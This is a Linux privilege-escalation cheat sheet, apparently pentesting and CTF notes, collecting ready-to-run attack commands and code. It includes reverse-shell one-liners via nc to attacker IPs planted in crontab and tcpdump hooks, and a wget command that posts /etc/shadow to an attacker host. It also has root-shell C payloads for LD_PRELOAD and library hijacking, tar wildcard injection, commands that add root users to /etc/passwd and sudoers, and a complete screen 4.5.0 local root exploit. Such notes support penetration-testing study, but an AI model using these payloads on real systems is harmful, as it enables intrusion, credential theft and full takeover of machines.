# Linux/Unix

## Enumerate Users

```bash
whoami
id
cat /etc/passwd
```

## Services/Processes Running

```bash
ps
ps au
ps aux
ps aux | grep root
ps -A # View all running processes
ps axjf # View process tree
```

## History

```bash
history
```

## Network Information

```bash
#list the TCP/IP configuration of every network adapter
ip a
# display network routing tables
/sbin/route(l)
route
ip route
# display active network connections and listening ports
netstat -ano
netstat -ant
netstat -a # shows all listening ports and established connections
netstat -at # list tcp protocols
netstat -au # list udp protocols
netstat -l # list ports in “listening” mode
netstat -tp(l) # list connections with the service name and PID information
ss -anp 
arp -a
ip neigh
```

## **Firewall Status and Rules**

```
grep -Hs iptables /etc/*
```

## Looting for passwords

#### Files containing passwords

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

#### Last edited files

Files that were edited in the last 10 minutes

```bash
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

#### In memory passwords

```bash
strings /dev/mem -n10 | grep -i PASS
```

#### Find sensitive files

```bash
locate password | more           
locate pwd| more
locate pass | more 
```

## SSH Key

#### Sensitive files

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
...
```

If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```bash
lojique@htb[/htb]$ vim id_rsa
lojique@htb[/htb]$ chmod 600 id_rsa
lojique@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```

## Scheduled tasks

#### Cron jobs

Check if you have access with write permission on these files.\
Check inside the file, to find other paths with write permissions.

```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.

```bash
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 
```

#### Create a malicious crontab

```bash
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f ' >> /etc/crontab

# if you don't have direct write access, try...
## locally
cp /etc/crontab .
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f ' >> crontab

# on victim
upload crontab
```

### Systemd timers

```python
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
```

## SUDO

```bash
sudo su -
```

Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)

### NOPASSWD

#### vim

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

#### tcpdump

```sh
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

```bash
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

```bash
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner

```bash
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Next, start a `netcat` listener on our attacking box run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```bash
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

```bash
lojique@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

## Shared Libraries

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

If `LD_PRELOAD` is explicitly defined in the sudoers file

```bash
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

#### Example:

{% embed url="https://lojique.gitbook.io/hack-the-box/v/photobomb/privilege-escalation" %}

#### Another Example

```bash
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles

sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

{% hint style="danger" %}
A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
{% endhint %}

#### Example

{% embed url="https://lojique.gitbook.io/proving-grounds/v/sybaris/privilege-escalation" %}

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

If you find some weird binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**. To do so you can execute:

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.

Create the file _/home/user/.config/libcalc.c_ with the code:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile it using:

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

And execute the binary.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

If you get an error such as

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

that means that the library you have generated needs to have a function called `a_function_name`.

#### CVE-2019-14287

{% embed url="https://www.exploit-db.com/exploits/47502" %}

Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, _despite being explicitly prevented from doing so_. It is worth noting that this will _only_ work if you've been granted non-root sudo permissions for the command

```bash
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## Sudo Shell Escaping

#### nmap

```bash
sudo nmap --interactive
nmap> !sh
```

#### vim

```bash
sudo vim -c ':!/bin/sh'
```

#### nano

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

#### apt

```bash
lojique@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

## SUID

SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distribution. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.

#### Find SUID binaries

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Find SGID binaries

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

#### wget

{% embed url="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" %}

This article explains perfectly how we can take advantage of this by adding a user to our /etc/passwd file and uploading it to the victim machine via wget, thus replacing its existing file

```bash
openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/usr/bin/bash
```

You can also abuse this by using wget to transfer a file to your local machine

```bash
# on victim machine
sudo wget --post-file=/etc/shadow http://[ATTACKER IP]:8081
# on kali
nc -lnvp 8081
```

#### apache2

You can get a shell or edit system files, but you can _**view**_ them

```
sudo apache2 -f /etc/shadow
```

## Create a SUID binary

<table><thead><tr><th width="121.5">Function</th><th>Description</th></tr></thead><tbody><tr><td>setreuid()</td><td>sets real and effective user IDs of the calling process</td></tr><tr><td>setuid()</td><td>sets the effective user ID of the calling process</td></tr><tr><td>setgid()</td><td>sets the effective group ID of the calling process</td></tr></tbody></table>

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

## Path

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" %}

{% code title="/tmp/shell" %}
```c
#include <unistd.h>
void main()
{    setuid(0);
     setgid(0);
     system("/bin/bash");   
}
```
{% endcode %}

```bash
cd /tmp
gcc shell.c -o shell
export PATH=/tmp:$PATH
./file_having_SUID_permissions
```

## Environmental Variables

#### Example 1

```python
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env
...SNIP...
.
.
.
service apache2 start
```

```bash
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service

export PATH=/tmp:$PATH

/usr/local/bin/suid_env

root@debian:~#
```

#### Example 2

```python
/usr/local/bin/suid-env2
strings /usr/local/bin/suid-env2
...SNIP...
.
.
.
/usr/sbin/service apache2 start
```

```python
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
.
.
.
root@debian:~#
```

## Capabilities

You can **search binaries with capabilities** using:

```python
getcap -r / 2>/dev/null
.
.
/usr/bin/python2.6 = cap_setuid+ep
```

Having the capability `ep` means the binary has all the capabilities.

```python
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~#
```

#### List capabilities of binaries

```python
╭─swissky@lab ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

#### Edit capabilities

```bash
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

#### Interesting capabilities

Having the capability =ep means the binary has all the capabilities.

```bash
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

Alternatively the following capabilities can be used in order to upgrade your current privileges.

```bash
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

Example of privilege escalation with `cap_setuid+ep`

```bash
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

<table><thead><tr><th width="246">Capabilities name</th><th>Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>Allow to enable/disable kernel auditing</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>Helps to write records to kernel auditing log</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>This feature can block system suspends</td></tr><tr><td>CAP_CHOWN</td><td>Allow user to make arbitrary change to files UIDs and GIDs</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>This helps to bypass file read, write and execute permission checks</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>This only bypasses file and directory read/execute permission checks</td></tr><tr><td>CAP_FOWNER</td><td>This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td></tr><tr><td>CAP_KILL</td><td>Allow the sending of signals to processes belonging to others</td></tr><tr><td>CAP_SETGID</td><td>Allow changing of the GID</td></tr><tr><td>CAP_SETUID</td><td>Allow changing of the UID</td></tr><tr><td>CAP_SETPCAP</td><td>Helps to transferring and removal of current set to any PID</td></tr><tr><td>CAP_IPC_LOCK</td><td>This helps to lock memory</td></tr><tr><td>CAP_MAC_ADMIN</td><td>Allow MAC configuration or state changes</td></tr><tr><td>CAP_NET_RAW</td><td>Use RAW and PACKET sockets</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>SERVICE Bind a socket to internet domain privileged ports</td></tr></tbody></table>

## Writeable Directories

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

## Writable files

List world writable files on the system.

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Writable /etc/passwd

{% embed url="https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/" %}

First generate a password with one of the following commands.

```bash
openssl passwd -1 -salt hacker hacker
openssl passwd newPassword
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```bash
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.\
WARNING: you might degrade the current security of the machine.

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

### Writable /etc/sudoers

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Tar Wildcard

#### **Tar Wildcard Injection (1st method)**

```bash
echo "mkfifo /tmp/lhennp; nc 192.168.45.5 443 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar * 
```

#### **Tar Wildcard Injection (2st method)**

```bash
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

sudo -l
sudo bash
whoami
```

#### Tar Wildcard Injection (3rd method)

```bash
echo "chmod u+s /usr/bin/find" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami
```

#### Tar Wildcard Injection (4th Method)

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +x runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh runme.sh
/tmp/bash -p
```

#### Resources

{% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}

## NFS Root Squashing

Read the \_ **/etc/exports** \_ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.

**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

## Privilege Escalation

### Remote Exploit

If you have found this vulnerability, you can exploit it:

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

```bash
lojique@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *s
```

```bash
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

```c
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```bash
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

```bash
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Hijacking Tmux Sessions

Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

&#x20;&#x20;

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

If we can compromise a user in the `dev` group, we can attach to this session and gain root access.

Check for any running `tmux` processes.

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirm permissions.

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Review our group membership.

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the `tmux` session and confirm root privileges.

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

## Docker

{% embed url="https://flast101.github.io/docker-privesc/" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" %}

{% embed url="https://gtfobins.github.io/gtfobins/docker/" %}

```bash
docker run -v /:/mnt --rm -it alphine chroot /mnt sh
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

#### Mounting Disk - Poc1

Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

So to take over the host machine, it is trivial:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.

## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

## Restricted Shell

{% embed url="https://0xffsec.com/handbook/shells/restricted-shells/" %}

Example:

```bash
vim
:set shell=/bin/bash
:shell
export PATH=/bin:/usr/bin or export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games
```

## **Screen Version Identification**

Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

```
screen -v
```

The below script can be used to perform this privilege escalation attack:

{% code title="Screen_Exploit_POC.sh" %}
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```
{% endcode %}

## Kernel Exploits

The following exploits are known to work well, search for more exploits with `searchsploit -w linux kernel centos`.

Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing

```bash
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
lscpu
```

Copy the kernel version and distribution, and search for it in google or in [https://www.exploit-db.com/](https://www.exploit-db.com/).

### CVE-2022-0847 (DirtyPipe)

Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11

```bash
https://www.exploit-db.com/exploits/50808
```

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

{% embed url="https://www.exploit-db.com/exploits/40839" %}

```c
// Compile with:
gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
"./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
```

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)

```
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

{% embed url="https://www.exploit-db.com/exploits/18411" %}

{% embed url="https://www.exploit-db.com/exploits/35161" %}

```bash
 gcc mempodipper.c -o mempodipper
 ./mempodipper
```

### CVE-2022-2588

{% embed url="https://github.com/Markakd/CVE-2022-2588" %}

## Credential Hunting

```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```

## Privileged Groups

### LXC/LXD

{% embed url="https://academy.hackthebox.com/module/51/section/477" %}

The privesc requires to run a container with elevated privileges and mount the host filesystem inside.

```bash
╭─swissky@lab ~  
╰─$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage r00t -c security.privileged=true

# mount the /root into the image
lxc config device add r00t mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start r00t
lxc exec r00t /bin/sh
```

Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)

## Automated Resources

{% embed url="https://github.com/rebootuser/LinEnum.git" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

